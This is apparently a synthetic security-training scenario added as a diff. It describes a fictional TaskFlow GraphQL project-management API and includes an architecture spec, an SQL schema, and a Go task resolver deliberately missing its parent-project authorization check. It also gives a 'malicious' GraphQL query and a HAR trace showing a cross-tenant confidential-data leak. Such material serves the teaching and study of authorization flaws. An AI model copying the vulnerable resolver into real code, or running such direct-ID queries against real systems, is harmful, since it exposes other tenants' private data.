@@ -1,0 +1,227 @@
+Here is the twenty-eighth system, continuing the focus on GraphQL-related vulnerabilities. We are returning to the **SaaS / Project Management** sector, focusing on a **Project Task Management GraphQL API** that handles team assignments.
+
+For the vulnerabilities, we are focusing on **Pattern 5.2 (GraphQL Resolver Traversal / BOLA in Edges)** combined with **Pattern 1.7 (Nested resources without parent authorization)**. This scenario demonstrates how an attacker exploits a weak authorization check on a nested GraphQL field (`Project.tasks`) to traverse from an authorized parent object (their own profile) to an unauthorized child object (a sensitive task belonging to another tenant).
+
+***
+
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** TaskFlow Project Management API
+**Document Version:** 6.1.0 (FINAL)
+**Classification:** CONFIDENTIAL / CORPORATE IP SCOPE
+**Domain:** SaaS / Project Management / Work Tracking
+
+## 1.0 Executive Summary
+TaskFlow uses a centralized GraphQL API to allow users to query their projects, tasks, and team members. To improve performance, authorization checks are primarily handled by the top-level resolvers (e.g., ensuring a user can query a specific Project ID). The assumption is that fields nested underneath an authorized parent object are implicitly safe, or that the nested resolver will handle authorization efficiently.
+
+The core security requirement is that authorization for tasks must be enforced against the task's parent project: if a user is not authorized for Project-A, they must never be able to read any Task belonging to Project-A, even if they can guess the Task ID.
+
+## 2.0 Comprehensive Network Topology & GraphQL Processing
+The architecture uses a federated GraphQL gateway to route requests to specialized microservices.
+
+### 2.1 The Ingress Layer & GraphQL Router
+* **API Gateway:** Handles all traffic routing to the single /graphql path.
+* **Apollo Federation Gateway:** The central hub that routes field requests based on the entity type (User, Project, Task).
+
+### 2.2 The Backend Core Services
+* **Project Service (Python Django):** Handles the Project entity and its members array.
+* **Task Service (Go-lang):** Handles the Task entity. This service contains the vulnerable task resolver logic.
+
+## 3.0 Identity, Sessions, and Authorization
+The security model relies on strict membership lists for project-level BOLA enforcement.
+
+### 3.1 Authorization Policy
+A user is authorized to read a Task only if:
+They are an authenticated user.
+The Task's project_id is linked to a project where the user is listed in the Project.members array.
+## 4.0 Known System Debt & Theoretical Attack Surfaces
+*Internal Security Engineering Note: The Task resolver in the Go-lang service was implemented to only check if the requested task ID exists, relying on the upstream Project resolver to perform all necessary BOLA checks. If an attacker knows the Task ID, they can bypass the parent's authorization by querying the task directly. Tracked as RISK-GRPH-703.*
+
+### 4.1 Vulnerability A: Task Resolver Traversal without Parent Authorization
+**Taxonomy Pattern:** 5.2 (Resolver traversal / BOLA in edges) & 1.7 (Nested resources without parent authorization)
+**Sub-system:** Task Service Resolver (Query: task(id: Int))
+
+**The Deep Architectural Flaw:**
+This vulnerability enables an attacker to directly access a restricted child object (Task) by skipping the required authorization check on its parent (Project).
+
+1. **Nested Resource BOLA (Pattern 1.7):** The attacker needs to read a task belonging to Project-X, which they are not a member of. Instead of querying the top-level project(id: X) (which would return null or 403), the attacker attempts to query the task directly using the specific Task ID (tsk-20045) associated with Project-X.
+
+2. **Resolver Traversal (Pattern 5.2):** The Go-lang task(id: Int) query resolver fails to look up the parent project and verify the user's membership. It only verifies that the task ID exists and returns the data. This means the task, which is conceptually a nested resource, is treated as a top-level resource, completely bypassing its contextual security check.
+
+**The Exploitation Path:**
+
+1. **Reconnaissance:** An attacker (User A) is a member of Project-A but wants to read confidential tasks belonging to another tenant's project, Project-B. The attacker guesses or discovers the ID of a sensitive task within Project-B (e.g., tsk-20045).
+2. **The Traversal Query:** The attacker crafts a simple GraphQL query to the top-level task resolver: query { task(id: 20045) { id name confidentialNotes } }.
+3. **The Execution:** The Apollo Federation Gateway routes the request to the Task Service. The Go-lang resolver finds Task ID 20045 in the database, sees that it belongs to Project-B, but fails to cross-check User A's membership in Project-B.
+4. **The Impact:** The attacker successfully extracts the confidentialNotes for a task belonging to an entirely different, unauthorized corporate tenant, leading to cross-tenant data leakage.
+
+***
+
+# TASKFLOW PROJECT API: SCHEMAS, VULNERABLE CODE, & GRAPHQL CONTRACTS
+**Document Version:** 4.1.0
+**Applies to Architecture:** TaskFlow Project Management API v6.1.0
+
+## 5.0 Task Ledger Schema (PostgreSQL)
+The database structure relies on the project_id foreign key to enforce security, but the application code fails to use it in the read resolver.
+
+```sql
+-- Core Task Table
+CREATE TABLE tasks (
+project_id INT REFERENCES projects(project_id) NOT NULL, -- THE CRITICAL PARENT LINK
+task_id SERIAL PRIMARY KEY,                        -- e.g., 20045
+task_name VARCHAR(100) NOT NULL,
+confidential_notes TEXT,                          -- Sensitive data
+status VARCHAR(20) DEFAULT 'TO_DO'
+);
+
+CREATE INDEX idx_task_project ON tasks(project_id);
+```
+
+## 6.0 The Flawed Implementation (Go-lang Task Service)
+The top-level task resolver executes a query that retrieves the task data but ignores the user's required authorization context (membership in the parent project).
+
+### 6.1 Vulnerable Task Resolver
+```go
+// File: handlers/taskResolver.go
+package handlers
+
+import (
+"context"
+"fmt"
+"github.com/graphql-go/graphql"
+"taskflow/pkg/db"
+)
+
+// Top-level Query: task(id: Int)
+var TaskQuery = &graphql.Field{
+Type:        TaskType,
+Description: "Get a task by ID.",
+Args: graphql.FieldConfigArgument{
+"id": &graphql.ArgumentConfig{
+Type: graphql.Int,
+},
+},
+Resolve: func(p graphql.ResolveParams) (interface{}, error) {
+taskId, ok := p.Args["id"].(int)
+if !ok {
+return nil, fmt.Errorf("Invalid task ID")
+}
+    // AuthContext contains the authenticated user ID
+    userId, _ := p.Context.Value("user\_id").(string)
+    
+    // VULNERABILITY 1.7: Missing Parent Authorization Check
+    // The code queries the task by ID, but does NOT verify that the authenticated 
+    // user is a member of the task's parent project (Project-B).
+    
+    // Step 1: Fetch Task (Retrieves sensitive data for Task 20045)
+    task, err := db.GetTaskByID(taskId) 
+    if err != nil || task == nil {
+        return nil, fmt.Errorf("Task not found")
+    }
+
+    // Step 2: Fails to call an external service or perform a DB lookup to check 
+    // if db.CheckUserProjectMembership(userId, task.ProjectID) is true.
+    // It relies entirely on the upstream gateway which only checks token validity.
+
+    return task, nil // Returns unauthorized, confidential data
+},
+}
+```
+
+## 7.0 GraphQL API Contract (The Direct Task Query)
+The attacker queries the single-ID task resolver, which should have been secured by checking the parent project's membership list.
+
+### 7.1 Execute Task BOLA
+**Endpoint:** POST /graphql
+**Description:** Queries a task ID not owned by the authenticated user's tenant.
+
+**Required Headers:**
+```http
+Authorization: Bearer <Attacker_UserA_JWT>
+Content-Type: application/json
+```
+
+**Malicious Request Payload:**
+```graphql
+query TaskBOLA {
+task(id: 20045) {
+id
+projectName: project { name } # Optional: Traverses to get Project-B's name
+confidentialNotes
+}
+}
+```
+
+**Success Response (200 OK - BOLA Leak):**
+```json
+{
+"data": {
+"task": {
+"id": 20045,
+"projectName": {
+"name": "Acquisition Target ORION (Tenant B)"
+},
+"confidentialNotes": "Final valuation report attached. Target company's core asset is IP, not physical infrastructure. Keep this strictly private."
+}
+}
+}
+```
+
+***
+
+# SYNTHETIC ARTIFACT: GRAPHQL TASK BOLA VIA DIRECT ID (HAR TRACE)
+**Applies to Architecture:** TaskFlow Project Management API v6.1.0
+**Vulnerabilities Referenced:** Section 4.1 (Pattern 5.2 & Pattern 1.7)
+
+This HTTP Archive (HAR) trace captures the moment an authenticated attacker (User A) successfully extracts confidential task data belonging to an unauthorized tenant (Tenant B). The attacker submits a simple GraphQL query to the top-level task(id: 20045) resolver, bypassing the security check that should have been enforced at the parent Project level.
+
+The Go-lang Task Service finds the task by its ID but fails to enforce that the task.project_id is linked to the authenticated user's membership list. The 200 OK response returns the task's sensitive confidentialNotes, confirming the Broken Object-Level Authorization (BOLA) on a nested resource, exploited via direct top-level query.
+
+```json
+{
+"log": {
+"version": "1.2",
+"creator": {
+"name": "Apollo Federation Gateway Logs",
+"version": "6.1.0"
+},
+"entries": [
+{
+"startedDateTime": "2026-04-10 T12:05:15.110Z",
+"time": 85,
+"request": {
+"method": "POST",
+"url": "https://api.taskflow.com/graphql",
+"httpVersion": "HTTP/2.0",
+"headers": [
+{ "name": ":authority", "value": "api.taskflow.com" },
+{ "name": "authorization", "value": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoidXNyX2F0dGFja2VyXzEifQ..." },
+{ "name": "content-type", "value": "application/json" }
+],
+"queryString": [],
+"postData": {
+"mimeType": "application/json",
+"text": "{\"query\": \"query TaskBOLA { task(id: 20045) { id projectName: project { name } confidentialNotes } }\"}"
+},
+"bodySize": 125
+},
+"response": {
+"status": 200,
+"statusText": "OK",
+"headers": [
+{ "name": "content-type", "value": "application/json" },
+{ "name": "x-service-resolved-by", "value": "TaskService" }
+],
+"content": {
+"size": 350,
+"mimeType": "application/json",
+"text": "{\"data\": {\"task\": {\"id\": 20045, \"projectName\": {\"name\": \"Acquisition Target ORION (Tenant B)\"}, \"confidentialNotes\": \"Final valuation report attached. Target company's core asset is IP, not physical infrastructure. Keep this strictly private.\"}}}"
+},
+"bodySize": 350
+}
+}
+]
+}
+}
+```
+
+***
